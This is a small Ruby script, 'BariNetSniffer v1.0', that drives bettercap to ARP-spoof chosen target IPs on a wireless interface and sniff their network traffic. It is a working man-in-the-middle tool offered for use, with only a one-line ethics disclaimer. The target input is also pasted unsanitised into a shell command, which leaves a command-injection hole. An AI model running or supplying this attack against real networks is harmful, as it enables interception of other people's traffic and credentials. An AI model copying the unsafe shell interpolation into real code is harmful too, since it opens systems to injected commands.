#!/usr/bin/ruby

def script(targets)
	script = "net.probe on;"
	script += "set arp.spoof.fullduplex true;"
	script += "set arp.spoof.targets #{targets};"
	script += "arp.spoof on;"
	script += "net.sniff on"
	system "bettercap -silent -iface wlan0 -eval \"#{script}\""
end

def interactive
	print "Enter targets IPs (separated with commas): "
	targets = gets.chomp
	script targets
end

system("sudo print")

if not system("bettercap -version > /dev/null") then
	puts "Bettercap v2.32 is required . .\nPlease install it and try again."
	exit
end

if ["-h", "--help", "-help", "help"].include? ARGV[0]  then
	puts "netsniffer <targets (separated by commas)>"
else
	puts "---------------------\n" + 
		" BariNetSniffer v1.0\n" +
		" Developed by: BariBGF\n" +
		" Based on `bettercap v2.32`\n" +
		" For security and ethical purposes only!\n" +
		" Exit by `ctrl + c`\n" +
		"--------------------\n" +
		"\n"
		
	if ARGV[0] != nil then
		script ARGV[0]
	else
		interactive
	end
end
